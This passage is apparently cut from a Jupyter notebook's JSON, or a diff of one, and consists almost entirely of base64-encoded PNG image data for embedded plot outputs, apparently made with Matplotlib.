aGDx+Oo0ePIjMz0\/xISEjAlClTkJmZCTc3N7FLtKnKykqcOXMGoaGhYpdiM4mJiU2WFzh16hQiIiJEqkgcKSkpUKvVGDdunKh1cIinwfz58zFt2jQkJCSgb9+++PDDD1FVVYWnnnpK7NJsorKy0uL\/lM6dO4fMzEwEBASgQ4cOIlZmG8nJyVi5ciXWrFkDpVJpnnvk6+sLT09PkauzjQULFmDMmDHo0KEDKioqsHLlSuzYsQObN28WuzSbUCqVTeYceXt7IzAw0CXmIr300ku4\/\/77ERERgfz8fLzxxhtwc3PDY489JnZpNjNv3jwMHDgQixYtwuTJk7Fv3z4sW7YMy5YtE7s0mzGZTEhJScG0adMgk4kcEUS5d8hOffzxx0KHDh0EuVwu9O3bV9izZ4\/YJdnM9u3bBQBNHtOmTRO7NJto7twBCCkpKWKXZjPTp08XIiIiBLlcLgQHBwvDhw8XtmzZInZZonKl24wfeeQRITQ0VJDL5UK7du2ERx55RDh9+rTYZdncunXrhJiYGEGhUAg9evQQli1bJnZJNrV582YBgJCdnS12KYJEEARBnGhERERE1DzOQSEiIiK7w4BCREREdocBhYiIiOwOAwoRERHZHQYUIiIisjsMKERERGR3GFCIiIjI7jCgEBERkd1hQCEiIiK7w4BCREREdocBhYiIiOwOAwoRERHZnf8PHkUEHaD5dKMAAAAASUVORK5CYII=\",\n+      \"image\/png\": \"iVBORw0KGgoAAAANSUhEUgAAAjAAAAGdCAYAAAAMm0nCAAAAOXRFWHRTb2Z0d2FyZQBNYXRwbG90bGliIHZlcnNpb24zLjcuMSwgaHR0cHM6Ly9tYXRwbG90bGliLm9yZy\/bCgiHAAAACXBIWXMAAA9hAAAPYQGoP6dpAABDEElEQVR4nO3deVxVdeL\/8de97CCLqIAouOe+o4jZNpFm5mTZopKZa6U2mdVozVgzU+ZkM01Zprmk5tYyZYuVfc0WsxAQxX3NBRQBDbkXULZ7z+8P6\/6ibFwCD5f7fj4e5w\/O+dxz3pcLnPfjcBaLYRgGIiIiIm7EanYAERERkYulAiMiIiJuRwVGRERE3I4KjIiIiLgdFRgRERFxOyowIiIi4nZUYERERMTtqMCIiIiI2\/E2O0B1cTqdZGdnExwcjMViMTuOiIiIXADDMCgsLCQ6Ohqr9bePs9TaApOdnU1MTIzZMUREROQSZGVl0bhx499cXmsLTHBwMHD2GxASEmJyGhEREbkQdrudmJgY1378t9TaAvPTv41CQkJUYERERNzM+U7\/0Em8IiIi4nZUYERERMTtqMCIiIiI21GBEREREbejAiMiIiJuRwVGRERE3I4KjIiIiLgdFRgRERFxOyowIiIi4nZUYERERMTtqMCIiIiI21GBEREREbejAiMiInKZ7Mq2M\/fr77GXlJsdxe3V2qdRi4iI1CTfHjjJ2Dc2cbrMwXubj\/L6vT1oXDfQ7FhuS0dgREREqtnaXbmMXJTG6TIHVgvsyy1i0Ozv2JpVYHY0t6UCIyIiUo0+yDjG\/cvSKXM46dc+ki8fvZY2UcGcLCrlrnnJrNmRY3ZEt6QCIyIiUk3eTM1k0lsZOJwGt3ZtxOxh3WhSL4j\/PtCba65oQEm5kweWp7Pgm4MYhmF2XLeiAiMiIlINFnxzkKnvbccwICk+ln\/f0Rlvr7O73Tp+3iwcEUdSfCyGAc98vJsnP9hJhcNpcmr3oQIjIiJShQzD4MXP9\/HMx7sBuO\/q5jwzqANWq6XSOG8vK88M6sBfB7TFYoGlG48w5o1NFJVWmBHb7ajAiIiIVBHDMHj2k928+Pl+AB654Qqm9m+DxWI553iLxcKYq5ozJ6k7\/j5Wvtp7gjvmJnPcduZyxnZLKjAiIiJVwOE0eGLVDuZ\/cwiAJ29ux4PXt\/rN8vJzN3aI4s1xCdSv48vu43YGzf6WHcds1R3ZranAiIiI\/E7lDieT385gZWomFgvMHNyJUX2aXdQ6usSEsWr8lbSKqEOuvZQ7X0vmiz251ZTY\/anAiIiI\/A4l5Q7GL9\/MBxnZeFstzBrSlTt7xFzSumLCA\/nvA73p07I+p8scjFmyiTeSD1dt4FpCBUZEROQSnS6rYMySTazdlYuvt5XXhndnYOfo37XO0AAfFo3swZ1xjXEa8OQHO\/nHR7twOHWZ9c+pwIiIiFwC25lyhi9MZcOBkwT6erH43h5c3zayStbt42XlucGdeKxfawBe\/\/YQ9y9L53SZrlD6iQqMiIjIRfqhqJRh8zeSfuQUIf7eLBsTT++W9at0GxaLhQnXteTloV3x9baydlcud722kTx7SZVux12pwIiIiFyEHFsJd83byM5sO\/WCfHlzXALdYutW2\/YGdo5m5dh4woN82X7MxqDZ37Inx15t23MXKjAiIiIXKCv\/NHe89h0H8opoGOrP2\/cn0C46pNq3271JOKvG96Z5\/SCybSXcPieZ9ftOVPt2azIVGBERkQtwIK+Q2+d+R1b+GWLDA3n7vgRaNKhz2bbfpF4Q743vTc9m4RSVVjBycRorUzMv2\/ZrGhUYERGR89hxzMadr20k115Kq4g6vHN\/AjHhgZc9R1igL0tH9+S2ro1wOA0ef287\/\/x0D04PvEJJBUZEROR\/SD+Sz9D5G8kvLqNjo1Deui+ByBB\/0\/L4eXvx7zs7MymxFQBzv\/6eiSs3U1LuMC2TGVRgREREfsOG\/Se5e0EqhSUV9Ghal+U\/nkxrNovFwqTEK\/jPXZ3x8bLwyfYchs7fyMmiUrOjXTYqMCIiIuewdlcuoxancabcwVWt6rNkVE9C\/H3MjlXJrV0bs3R0PKEBPmzJLODWV7\/lQF6h2bEuCxUYERGRX\/gg4xj3L0unzOGkX\/tIFoyII9DX2+xY59SreT3eG9+b2PBAsvLPcNur3\/Hd9yfNjlXtVGBERER+ZmVqJpPeysDhNLitayNmD+uGn7eX2bH+pxYN6rBqfG+6N6mLvaSCexam8t\/0o2bHqlYqMCIiIj9a8M1BHn9vO4YBSfGx\/OuOznh7uceusl4dP5aPiefmTg2pcBo8+s5WXvi\/vRhG7bxCyT0+FRERkWpkGAYvfr6PZz7eDcB9VzfnmUEdsFotJie7OP4+Xswa0pUJ17UAYNYXB5j0VgalFbXvCiUVGBER8WiGYfDsJ7t58fP9ADxywxVM7d8Gi8W9ystPrFYLj\/Vrw8zBnfC2WvggI5u7F6RwqrjM7GhVSgVGREQ8lsNp8MSqHcz\/5hAAT97cjgevb+W25eXn7uwRw+KRPQn28ybt8Clum\/Mdh04Wmx2ryqjAiIiIRyp3OJn8dgYrUzOxWGDm4E6M6tPM7FhVqk+r+rw7vjeNwgI4dLKYW1\/9lrTD+WbHqhIqMCIi4nFKyh2MX76ZDzKy8bZamDWkK3f2iDE7VrW4IjKY9ydcSefGoRScLidpfgofZBwzO9bvpgIjIiIe5XRZBWOWbGLtrlx8va28Nrw7AztHmx2rWjUI9uPNcQn0ax9JmcPJQ29m8PK6\/W59hZIKjIiIeAzbmXKGL0xlw4GTBPp6sXhkD65vG2l2rMsiwNeLOUndGXd1cwD+vXYfj\/13G2UVTpOTXRoVGBER8Qg\/FJUybP5G0o+cIsTfm2Vj4undor7ZsS4rq9XCEze15elBHbBa4L\/pRxnxeiq20+VmR7toF11g1q9fz8CBA4mOjsZisfD++++7lpWXlzNlyhQ6duxIUFAQ0dHR3HPPPWRnZ1daR35+PklJSYSEhBAWFsbo0aMpKiqqNGbbtm1cddVV+Pv7ExMTw8yZMy\/tHYqIiMfLsZVw17yN7My2Uy\/IlzfHJdAttq7ZsUwzvFcTFt7bgyBfL5IP\/sBtc74lK\/+02bEuykUXmOLiYjp37szs2bN\/tez06dNs3ryZadOmsXnzZt577z327t3LH\/\/4x0rjkpKS2LlzJ2vXrmX16tWsX7+ecePGuZbb7Xb69u1LkyZNSE9P5\/nnn+dvf\/sb8+bNu4S3KCIiniwr\/zR3vPYdB\/KKaBjqz9v3J9AuOsTsWKa7rnUE79zfm6gQf74\/Ucyg2d+yOfOU2bEumMX4HWfwWCwWVq1axaBBg35zTFpaGj179uTIkSPExsaye\/du2rVrR1paGnFxcQCsWbOGm266iaNHjxIdHc2cOXP4y1\/+Qk5ODr6+Zx9bPnXqVN5\/\/3327NlzQdnsdjuhoaHYbDZCQvSDKiLiiQ7kFZK0IIVceylN6gWybHQ8MeGBZseqUXJsJYxeksbObDt+3lb+c1cXburY0LQ8F7r\/rvZzYGw2GxaLhbCwMACSk5MJCwtzlReAxMRErFYrKSkprjFXX321q7wA9OvXj71793Lq1LnbYWlpKXa7vdIkIiKea8cxG3e+tpFceylXRNbhnfsSVF7OISrUn7fvS+D6NhGUVjgZv3wzr339fY2\/QqlaC0xJSQlTpkxh6NChrhaVk5NDREREpXHe3t6Eh4eTk5PjGhMZWfms8J++\/mnML82YMYPQ0FDXFBNTO6\/nFxGR80s\/ks\/Q+RvJLy6jY6NQ3hyXQESIv9mxaqwgP2\/m3RPHvb2bAjDj0z08sWoH5Y6ae4VStRWY8vJy7rzzTgzDYM6cOdW1GZfHH38cm83mmrKysqp9myIiUvNs2H+SuxekUlhSQY+mdVk+Np7wIN\/zv9DDeVkt\/O2P7XlqYDssFliZmsmoxWnYS2rmFUrVUmB+Ki9Hjhxh7dq1lf6HFRUVRV5eXqXxFRUV5OfnExUV5RqTm5tbacxPX\/805pf8\/PwICQmpNImIiGdZuyuXUYvTOFPu4KpW9Vkyqich\/j5mx3IrI69sxrzhcQT4ePHN\/pPcMSeZYwVnzI71K1VeYH4qL\/v37+fzzz+nXr16lZYnJCRQUFBAenq6a94XX3yB0+kkPj7eNWb9+vWUl\/\/\/1rd27Vpat25N3bqee9mbiIj8tg8yjnH\/snTKHE76tY9kwYg4An29zY7llm5oF8nb9yXQINiPvbmFDJr9LduP2syOVclFF5iioiIyMjLIyMgA4NChQ2RkZJCZmUl5eTm33347mzZtYvny5TgcDnJycsjJyaGs7OxjvNu2bcuNN97I2LFjSU1N5dtvv2XixIkMGTKE6Oizt3IeNmwYvr6+jB49mp07d\/LWW2\/x0ksvMXny5Kp75yIiUmusTM1k0lsZOJwGt3VtxOxh3fDz9jI7llvr2DiU9ydcSZuoYE4UlnLna8n8385zn4dqhou+jPqrr77iuuuu+9X8ESNG8Le\/\/Y1mzc79JM8vv\/ySa6+9Fjh7I7uJEyfy0UcfYbVaGTx4MLNmzaJOnTqu8du2bWPChAmkpaVRv359HnzwQaZMmXLBOXUZtYiIZ1jwzUGe+Xg3AEnxsTx9SwesVovJqWqPwpJyxi\/fzDf7T2KxwLQB7ar1qd0Xuv\/+XfeBqclUYEREajfDMHhp3X5e\/Hw\/APdd3Zyp\/dtgsai8VLVyh5MnP9jJytRMAEYkNGHaze3w9qr6U2lrzH1gREREqpphGDz7yW5XeXm07xUqL9XIx8vKs7d24Imb2gCwJPkI45amU1xaYVomFRgREXErDqfBE6u2M\/+bQwA8eXM7Jv6hlcpLNbNYLIy7ugVzkrrh523liz15PLFqu2l5dHq2iIi4jXKHk0ff2coHGdlYLPDcbZ24s4duXHo59e\/YkKhQf55YtYPH+rU2LYcKjIiIuIWScgcPrtzC2l25eFst\/OeuLgzsHG12LI\/UNbYuHz\/Yx9STpVVgRESkxjtdVsG4N9LZcOAkvt5W5t7djT+0iTz\/C6XamH2llwqMiIjUaMWlFdy7KJW0w6cI9PViwYg4ereob3YsMZkKjIiI1FhnyhyMXpJG2uFTBPt7s2RUT7rF6o7sogIjIiI1VEm5g7FvbGLjwXzq+HnzxqiedFV5kR\/pMmoREalxSisc3Lf07Dkvgb5eLB7ZQ+VFKlGBERGRGqWswsn4ZZv5et8J\/H2sLLq3B3FNw82OJTWMCoyIiNQY5Q4nD67czLo9efh5W1k4ogfxzeuZHUtqIBUYERGpESocTia9lcFnO3Px9bIy7544rmypq43k3FRgRETEdA6nwSPvbOXjbcfx8bIwd3g3rrmigdmxpAZTgREREVM5nQZ\/\/u82PsjIxttqYfYw3aROzk8FRkRETOP88cGM724+ipfVwqyhXenbPsrsWOIGVGBERMQUhmHw5Ic7eDMtC6sFXrizMzd1bGh2LHETKjAiInLZGYbBP1bvYtnGTCwW+NcdnbmlSyOzY4kbUYEREZHLyjAMZny6h0XfHgbguds6cVu3xuaGErejAiMiIpeNYRg8\/9le5q0\/CMD0WztwZ48Yk1OJO1KBERGRy+aldft59avvAfj7H9uTFN\/E5ETirlRgRETkspj95QFe\/Hw\/AH8d0JYRvZuaG0jcmgqMiIhUu9e+\/p7nP9sLwJQb2zDmquYmJxJ3pwIjIiLVauGGQ8z4dA8Aj9xwBQ9c28LkRFIbqMCIiEi1eSP5ME+v3gXAn\/7Qkgevb2VyIqktVGBERKRarEzN5MkPdgJw\/zUtePiGK0xOJLWJCoyIiFS5dzZl8cSq7QCM6dOMKTe2xmKxmJxKahMVGBERqVKrthzlz+9uwzDg3t5N+cuAtiovUuVUYEREpMqs3pbNI29vxTAgKT6Wpwa2U3mRaqECIyIiVWLNjuM89GYGTgPujGvM07d0UHmRaqMCIyIiv9vnu3KZuGILDqfBbV0bMeO2TlitKi9SfVRgRETkd\/lybx7jl2+mwmnwx87RPH9HZ7xUXqSaqcCIiMgl+2b\/Ce5bmk6Zw8lNHaN44U6VF7k8VGBEROSSfPf9ScYs2URZhZMb2kXy0pCueHtptyKXh37SRETkoqUeymf04k2UVjj5Q5sIXhnWFR+VF7mM9NMmIiIXJf3IKUYuSuVMuYOrWtXn1aRu+Hl7mR1LPIwKjIiIXLCMrALufT2V4jIHvVvUY\/49cfj7qLzI5acCIyIiF2THMRv3LEyhsLSCns3CWTBC5UXMowIjIiLntfu4nbsXpmAvqSCuSV0W3duDQF9vs2OJB1OBERGR\/2lfbiFJC1IoOF1Ol5gwFo3sQZCfyouYSwVGRER+04G8IobNTyG\/uIyOjUJZMqonwf4+ZscSUYEREZFzO3SymGHzN3KyqJS2DUNYOronoQEqL1IzqMCIiMivZP5wmmHzN5JXWErryGCWj4knLNDX7FgiLiowIiJSydFTpxk6fyPHbSW0jKjD8rHxhAepvEjNogIjIiIux21nGDY\/hWMFZ2hWP4gVY+KpX8fP7Fgiv6ICIyIiAOTaSxg2P4XM\/NPEhgeyYmw8ESH+ZscSOScVGBER4URhKcPmb+TQyWIa1w1g5bheNAwNMDuWyG9SgRER8XA\/FJWStGAj358oJjrUn5Vje9EoTOVFaraLLjDr169n4MCBREdHY7FYeP\/99ystf++99+jbty\/16tXDYrGQkZHxq3WUlJQwYcIE6tWrR506dRg8eDC5ubmVxmRmZjJgwAACAwOJiIjgscceo6Ki4mLjiojI\/3CquIykBSnsyy0iMsSPFWN7ERMeaHYskfO66AJTXFxM586dmT179m8u79OnD88999xvruPhhx\/mo48+4p133uHrr78mOzub2267zbXc4XAwYMAAysrK+O6771iyZAmLFy\/mySefvNi4IiLyG2ynyxn+egp7cgqpX+dseWlaP8jsWCIXxGIYhnHJL7ZYWLVqFYMGDfrVssOHD9OsWTO2bNlCly5dXPNtNhsNGjRgxYoV3H777QDs2bOHtm3bkpycTK9evfj000+5+eabyc7OJjIyEoC5c+cyZcoUTpw4ga\/v+S\/ns9vthIaGYrPZCAkJudS3KCJSK9lLyhm+IIWtR23UC\/LlzXG9aBUZbHYskQvef1\/2c2DS09MpLy8nMTHRNa9NmzbExsaSnJwMQHJyMh07dnSVF4B+\/fpht9vZuXPnOddbWlqK3W6vNImIyK8VlVYwclEaW4\/aqBvow\/Kx8Sov4nYue4HJycnB19eXsLCwSvMjIyPJyclxjfl5eflp+U\/LzmXGjBmEhoa6ppiYmKoPLyLi5k6XVTBqURrpR04R4u\/N0tHxtInSUWpxP7XmKqTHH38cm83mmrKyssyOJCJSo5wpczB68SZSD+cT7OfNsjHxdGgUanYskUty2Z+HHhUVRVlZGQUFBZWOwuTm5hIVFeUak5qaWul1P12l9NOYX\/Lz88PPT3eLFBE5l5JyB+OWbiL54A8E+XqxZHRPOjUOMzuWyCW77Edgunfvjo+PD+vWrXPN27t3L5mZmSQkJACQkJDA9u3bycvLc41Zu3YtISEhtGvX7nJHFhFxa6UVDh5Yls43+08S6OvF4lE96RZb1+xYIr\/LRR+BKSoq4sCBA66vDx06REZGBuHh4cTGxpKfn09mZibZ2dnA2XICZ4+cREVFERoayujRo5k8eTLh4eGEhITw4IMPkpCQQK9evQDo27cv7dq1Y\/jw4cycOZOcnBz++te\/MmHCBB1lERG5CGUVTiYs38KXe0\/g72Nl4Yge9GgabnYskd\/PuEhffvmlAfxqGjFihGEYhrFo0aJzLn\/qqadc6zhz5owxfvx4o27dukZgYKBx6623GsePH6+0ncOHDxv9+\/c3AgICjPr16xuPPPKIUV5efsE5bTabARg2m+1i36KISK2w+Ui+MeS1ZKPJlNXGFX\/5xPhm3wmzI4mc14Xuv3\/XfWBqMt0HRkQ8kWEYJH\/\/A698eYDvvv8BAF8vK\/Pu6c61rSNMTidyfhe6\/77sJ\/GKiEjVMwyDdbvzmP3VAbZkFgDgbbUwqGsjxl\/bguYN6pgbUKSKqcCIiLgxh9Pgk+3Hmf3lAfbkFALg621lSI8Yxl3dnMZ19VwjqZ1UYERE3FBZhZP3txxjztffc+hkMQBBvl7cndCE0X2aERHsb3JCkeqlAiMi4kZKyh28lZbFvPUHOVZwBoDQAB9GXtmUe3s3JSzw\/M+KE6kNVGBERNxAYUk5y1MyWfDNIU4WlQLQINiPsVc1Y1h8E+r46c+5eBb9xIuI1GCnistY9N1hFn97CHtJBQCNwgK4\/5rm3BEXg7+Pl8kJRcyhAiMiUgPl2UtYsOEQyzYe4XSZA4DmDYIYf21LbukSjY9XrXmUncglUYEREalBsvJP89r673l701HKKpwAtGsYwoTrWnJjhyi8rBaTE4rUDCowIiI1wIG8Il796gAfZGTjcJ69v2j3JnWZeF1Lrm3dAItFxUXk51RgRERMtOOYjVe\/OsCnO3L46b7oV7Wqz\/hrW9KrebiKi8hvUIERETHBpsP5vPLlAb7ae8I174Z2kUy4riVdYsLMCybiJlRgREQuE8Mw2HDgJK98cYCUQ\/kAWC0wsHM0D1zbgjZRem6byIVSgRERqWZOp8Ha3bm8+uUBth61AeDjZWFwt8bcf00LmtYPMjmhiPtRgRERqSYVDiertx3n1a8OsC+3CAB\/HytDe8Yy7urmNAwNMDmhiPtSgRERqWKlFQ7e23yMuV9\/z5EfTgMQ7OfN8IQmjOrTjPp1\/ExOKOL+VGBERKrI6bIKVqZmMX\/9QXLsJQDUDfRhdJ9mDE9oSmiAj8kJRWoPFRgRkd\/JXlLO0uQjLNxwiPziMgAiQ\/wYe1VzhsXHEuirP7UiVU2\/VSIilyi\/uIzXNxxiSfJhCn98TlFseCD3X9OCwd0b4eet5xSJVBcVGBGRi5RjK2He+oOsTM3kTPnZ5xS1iqjDhOtacnOnhnjrOUUi1U4FRkTkAh35oZi5Xx\/k3fSjlDnOPqeoY6NQJlzXkr7tIrHqOUUil40KjIjIeezLLeTVLw\/w4dZsfnxMET2bhTPxupZc1aq+bvcvYgIVGBGR37DtaAGzvzzAZztzXfOuuaIBE\/\/Qkh5Nw01MJiIqMCIiv1Ba4eDhtzL4ZHsOABYL3Ng+ignXtaRDo1CT04kIqMCIiFTicBo8tDKDNTtz8LJauKVLNOOvbUHLiGCzo4nIz6jAiIj8yDAM\/rJqO2t25uDrZWXxyB70blnf7Fgicg661k9E5EfPf7aXN9OysFpg1tAuKi8iNZgKjIgIMH\/9QV796nsAnr21Izd2aGhyIhH5X1RgRMTjvbMpi+mf7AZgyo1tGNIz1uREInI+KjAi4tHW7spl6nvbARh3dXPuv6a5yYlE5EKowIiIx9p48AcmrNiMw2lwR\/fGPN6\/jW5KJ+ImVGBExCPtOGZj7JJNlFU4uaFdJDNu66jyIuJGVGBExOMcOlnMvYtSKSytIL5ZOC8P7aoHMIq4Gf3GiohHybWXMHxhCieLymgfHcL8EXH4+3iZHUtELpIKjIh4jILTZdyzMJWjp87QrH4QS0b1JMTfx+xYInIJVGBExCOcLqtg1OI09uYWEhnixxujelK\/jp\/ZsUTkEqnAiEitV1bh5IFlm9mcWUBogA9vjIonJjzQ7Fgi8juowIhIreZ0Gjz6zla+3neCAB8vXr+3B62j9GBGEXenAiMitZZhGPz9o518uDUbHy8Lc4d3p3uTumbHEpEqoAIjIrXWS+v2syT5CBYL\/PvOLlxzRQOzI4lIFVGBEZFaacl3h3nx8\/0A\/OOP7flj52iTE4lIVVKBEZFa54OMYzz14U4AHk68guEJTc0NJCJVTgVGRGqVr\/bm8cjbWwEYkdCEP13f0uREIlIdVGBEpNZIP5LP\/cvSqXAa\/LFzNE8NbK\/nG4nUUiowIlIr7M0pZOSiNErKnVzbugH\/uqMzVqvKi0htpQIjIm4vK\/80wxemYC+poHuTusxJ6o6vt\/68idRm+g0XEbd2orCU4QtTyCsspXVkMK+P6EGArx7OKFLbqcCIiNuyl5Qz4vVUDv9wmsZ1A3hjdE9CA\/VwRhFPcNEFZv369QwcOJDo6GgsFgvvv\/9+peWGYfDkk0\/SsGFDAgICSExMZP\/+\/ZXG5Ofnk5SUREhICGFhYYwePZqioqJKY7Zt28ZVV12Fv78\/MTExzJw58+LfnYjUWiXlDsYs2cSu43bq1\/Fl2eh4IkP8zY4lIpfJRReY4uJiOnfuzOzZs8+5fObMmcyaNYu5c+eSkpJCUFAQ\/fr1o6SkxDUmKSmJnTt3snbtWlavXs369esZN26ca7ndbqdv3740adKE9PR0nn\/+ef72t78xb968S3iLIlLbVDicTFyxhdRD+QT7ebNkVE+a1g8yO5aIXE7G7wAYq1atcn3tdDqNqKgo4\/nnn3fNKygoMPz8\/IyVK1cahmEYu3btMgAjLS3NNebTTz81LBaLcezYMcMwDOPVV1816tata5SWlrrGTJkyxWjduvUFZ7PZbAZg2Gy2S317IlIDORxOY\/JbGUaTKauNK\/7yibHx+5NmRxKRKnSh++8qPQfm0KFD5OTkkJiY6JoXGhpKfHw8ycnJACQnJxMWFkZcXJxrTGJiIlarlZSUFNeYq6++Gl9fX9eYfv36sXfvXk6dOnXObZeWlmK32ytNIlK7GIbBs5\/s5t3NR\/GyWnhlWDfim9czO5aImKBKC0xOTg4AkZGRleZHRka6luXk5BAREVFpube3N+Hh4ZXGnGsdP9\/GL82YMYPQ0FDXFBMT8\/vfkIjUKHO+\/p4FGw4BMHNwJ25oF3meV4hIbVVrrkJ6\/PHHsdlsrikrK8vsSCJShVamZjJzzV4A\/jqgLYO7NzY5kYiYqUoLTFRUFAC5ubmV5ufm5rqWRUVFkZeXV2l5RUUF+fn5lcacax0\/38Yv+fn5ERISUmkSkdrh0+3H+cuq7QCMv7YFY65qbnIiETFblRaYZs2aERUVxbp161zz7HY7KSkpJCQkAJCQkEBBQQHp6emuMV988QVOp5P4+HjXmPXr11NeXu4as3btWlq3bk3dunWrMrKI1HDfHjjJQ29m4DRgaM8YHuvX2uxIIlIDXHSBKSoqIiMjg4yMDODsibsZGRlkZmZisViYNGkSzzzzDB9++CHbt2\/nnnvuITo6mkGDBgHQtm1bbrzxRsaOHUtqairffvstEydOZMiQIURHRwMwbNgwfH19GT16NDt37uStt97ipZdeYvLkyVX2xkWk5tt2tIBxb2yizOGkf4conhnUUQ9nFJGzLvbypi+\/\/NIAfjWNGDHCMIyzl1JPmzbNiIyMNPz8\/Izrr7\/e2Lt3b6V1\/PDDD8bQoUONOnXqGCEhIcbIkSONwsLCSmO2bt1q9OnTx\/Dz8zMaNWpk\/POf\/7yonLqMWsS97c8tNLr+4\/+MJlNWG8PmJxsl5RVmRxKRy+BC998WwzAME\/tTtbHb7YSGhmKz2XQ+jIibyS44w+1zviPbVkLnxqEsH9uLOn7eZscSkcvgQvffteYqJBGpHfKLyxi+MIVsWwnNGwSxaGRPlRcR+RUVGBGpMYpKKxi5KJXvTxQTHerPstHxhAf5nv+FIuJxVGBEpEYorXBw\/9J0th61UTfQhzdGxxMdFmB2LBGpoVRgRMR0DqfBw29lsOHASQJ9vVg8sictI+qYHUtEajAVGBExlWEY\/PX9HXyyPQdfLyvzhsfROSbM7FgiUsOpwIiIqf71f3tZmZqJ1QIvDelCn1b1zY4kIm5ABUZETLPgm4PM\/vJ7AKbf2pH+HRuanEhE3IUKjIiY4t30ozzz8W4AHuvXmqE9Y01OJCLuRAVGRC67z3fl8ud3twEwpk8zxl\/bwuREIuJuVGBE5LJKPZTPhBWbcTgNBndrzBM3tdXzjUTkoqnAiMhlszPbxujFaZRWOElsG8Fzgztitaq8iMjFU4ERkcvi8MliRryeRmFpBT2bhvPKsG54e+lPkIhcGv31EJFql2cvYfjrKZwsKqVtwxAW3BuHv4+X2bFExI2pwIhItbKdLuee11PJyj9D03qBvDGqJyH+PmbHEhE3pwIjItXmTJmDUUvS2JNTSESwH0tHx9Mg2M\/sWCJSC6jAiEi1KHc4eWB5OulHThHi780bo3sSEx5odiwRqSVUYESkyjmdBo++s5Wv9p7A38fKopE9aBMVYnYsEalFVGBEpEoZhsE\/Vu\/ig4xsvK0W5tzdne5Nws2OJSK1jAqMiFSpl784wOLvDgPw7zs7c13rCHMDiUitpAIjIlVmzlff88LafQD8bWA7bunSyOREIlJbqcCISJWY89X3PLdmDwCP3HAF917ZzOREIlKbqcCIyO\/28\/Iy+YYrePD6ViYnEpHaTgVGRH6XX5aXP6m8iMhloAIjIpdM5UVEzKICIyKXROVFRMzkbXYAEXE\/r351gJlr9gIqLyJiDhUYEbkoPy8vj+iEXRExif6FJCIXTOVFRGoKFRgRuSAqLyJSk6jAiMh5qbyISE2jAiMi\/5PKi4jURDqJV0R+0+wvD\/D8ZyovIlLzqMCIyDn9vLw82vcKJv5B5UVEag79C0lEfkXlRURqOhUYEalE5UVE3IEKjIi4qLyIiLtQgRERQOVFRNyLCoyIqLyIiNtRgRHxcCovIuKOdBm1iAf7eXl5rF9rJlzX0uREIiIXRkdgRDyUyouIuDMVGBEPpPIiIu5OBUbEw6i8iEhtoHNgRDzIK1\/s51\/\/tw9QeRER96YjMCIeQuVFRGoTFRgRD6DyIiK1jQqMSC2n8iIitVG1FJjCwkImTZpEkyZNCAgIoHfv3qSlpbmWG4bBk08+ScOGDQkICCAxMZH9+\/dXWkd+fj5JSUmEhIQQFhbG6NGjKSoqqo64IrWWyouI1FbVUmDGjBnD2rVrWbp0Kdu3b6dv374kJiZy7NgxAGbOnMmsWbOYO3cuKSkpBAUF0a9fP0pKSlzrSEpKYufOnaxdu5bVq1ezfv16xo0bVx1xRWollRcRqc0shmEYVbnCM2fOEBwczAcffMCAAQNc87t3707\/\/v15+umniY6O5pFHHuHRRx8FwGazERkZyeLFixkyZAi7d++mXbt2pKWlERcXB8CaNWu46aabOHr0KNHR0efNYbfbCQ0NxWazERISUpVvUaTGU3kREXd1ofvvKj8CU1FRgcPhwN\/fv9L8gIAANmzYwKFDh8jJySExMdG1LDQ0lPj4eJKTkwFITk4mLCzMVV4AEhMTsVqtpKSknHO7paWl2O32SpOIJ3p5ncqLiNR+VV5ggoODSUhI4OmnnyY7OxuHw8GyZctITk7m+PHj5OTkABAZGVnpdZGRka5lOTk5REREVFru7e1NeHi4a8wvzZgxg9DQUNcUExNT1W9NpMZ7ed1+\/r32bHn5840qLyJSe1XLOTBLly7FMAwaNWqEn58fs2bNYujQoVit1XfR0+OPP47NZnNNWVlZ1bYtkZrol+Vl\/LUqLyJSe1VLo2jRogVff\/01RUVFZGVlkZqaSnl5Oc2bNycqKgqA3NzcSq\/Jzc11LYuKiiIvL6\/S8oqKCvLz811jfsnPz4+QkJBKk4inUHkREU9TrfeBCQoKomHDhpw6dYrPPvuMW265hWbNmhEVFcW6detc4+x2OykpKSQkJACQkJBAQUEB6enprjFffPEFTqeT+Pj46ows4nZUXkTEE1XLs5A+++wzDMOgdevWHDhwgMcee4w2bdowcuRILBYLkyZN4plnnqFVq1Y0a9aMadOmER0dzaBBgwBo27YtN954I2PHjmXu3LmUl5czceJEhgwZckFXIIl4CpUXEfFU1VJgbDYbjz\/+OEePHiU8PJzBgwczffp0fHx8APjzn\/9McXEx48aNo6CggD59+rBmzZpKVy4tX76ciRMncv3112O1Whk8eDCzZs2qjrgibmnWuv28oPIiIh6qyu8DU1PoPjBSm\/28vEy5sQ0PXNvC5EQiIlXDtPvAiEj1UnkREVGBEXErKi8iImepwIi4CZUXEZH\/TwVGxA2ovIiIVFYtVyGJSNV56fP9\/OdzlRcRkZ\/TERiRGkzlRUTk3HQERqSG+nl5mdq\/Dfdfo\/IiIvITHYERqYFUXkRE\/jcVGJEaRuVFROT8VGBEahCVFxGRC6NzYERqAMMwmLXugMqLiMgFUoERMVlphYNp7+\/g7U1HAZUXEZELoQIjYqJcewn3L0tnS2YBVgv8dUA7RvVpZnYsEZEaTwVGxCRbMk9x39J08gpLCfH35uVh3bjmigZmxxIRcQsqMCImeHtTFn9dtYMyh5MrIuswb3gcTesHmR1LRMRtqMCIXEblDifTP97N4u8OA9C3XSQv3NWFOn76VRQRuRj6qylymeQXlzFh+WaSD\/4AwKTEVvzpD62wWi0mJxMRcT8qMCKXwc5sG+PeSOdYwRmCfL144a4u9GsfZXYsERG3pQIjUs0+2prNY\/\/dSkm5k6b1Apl3TxxXRAabHUtExK2pwIhUE4fT4F\/\/t5c5X30PwFWt6vPK0G6EBvqYnExExP2pwIhUA9uZch56cwtf7T0BwH1XN+fPN7bBS+e7iIhUCRUYkSp2IK+QcW+kc\/BkMX7eVmbe3olbujQyO5aISK2iAiNShT7flcuktzIoKq0gOtSfeffE0aFRqNmxRERqHRUYkSpgGAavfHGAFz7fh2FAz2bhvJrUjfp1\/MyOJiJSK6nAiPxOxaUVPPrOVj7dkQPA8F5NeHJgO3y8rCYnExGpvVRgRH6HzB9OM27pJvbkFOLjZeHpWzowpGes2bFERGo9FRiRS7Rh\/0kmrtxMwely6tfx47Xh3ejeJNzsWCIiHkEFRuQiGYbBwg2HePaT3TgN6Nw4lNeGxxEV6m92NBERj6ECI3IRSsodPLFqO+9tPgbA4G6NmX5rB\/x9vExOJiLiWVRgRC7QcdsZ7luazrajNrysFv5yU1tGXtkUi0U3pxMRudxUYEQuwKbD+dy\/bDMni0oJC\/Rh9rBuXNmyvtm